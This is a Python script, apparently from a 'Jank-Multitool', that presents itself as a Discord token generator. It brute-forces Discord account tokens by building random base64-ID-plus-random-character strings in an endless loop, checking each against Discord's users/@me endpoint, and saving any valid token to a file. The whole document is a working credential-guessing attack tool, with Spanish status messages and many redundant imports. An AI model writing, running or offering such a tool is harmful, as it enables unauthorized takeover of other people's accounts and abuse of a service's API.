try:   
  def main2():  
    import discord
    import string
    import requests as req
    import requests 
    import datetime
    import random
    import time
    import base64
    from threading import Thread as thr
    import os
    from colorama import Fore
    import discord, os, json
    from discord.ext import commands
    from discord.ext.commands import Bot
    from plyer import notification
    from tkinter import messagebox
    from urllib.request import urlopen, Request

    os.system(f'title Discord Token Generator By Jank3')

    def random_token_discord_gen():
            request_url = "https://discordapp.com/api/v8/users/@me"

            def check1():
                    token1 = ""
                    while True:
                        try:
                            ids = list(['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'])
                            ide = ('').join(random.choices(ids, k=18))
                            ideutf8 = ide.encode("UTF-8")
                            ideencode = base64.b64encode(ideutf8)
                            ideencode1 = ideencode.decode("UTF-8")

                            caracteres = list(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '_'])     
                            token1 = ideencode1 + ('').join(random.choices(caracteres, k=35))

                            headers = {'Authorization': token1, 'Content-Type': 'application/json'}  
                            req = requests.get(request_url, headers=headers)

                            if req.status_code == 401:
                                print(f"Inválido | {token1}")
                                f = open('tokens_discord_invalidos.txt', "+a")
                                f.write(f'{token1}\n')
                                f.close()

                            elif req.status_code == 200:
                                print(f"Válido | {token1}")
                                f = open('token_discord_valido.txt', "+a")
                                f.write(f'{token1}\n')
                                f.close()
                                messagebox.showinfo(message=f"¡Token valido encontrado!", title="Token Gen Jank-Multitool")
                                break
                        except KeyboardInterrupt:
                            print("")
                            print(f"Presionaste Ctrl + C")
                            break
                        
                        
            check1()
    random_token_discord_gen()
except KeyboardInterrupt:
    print("Presionaste Ctrl + C")
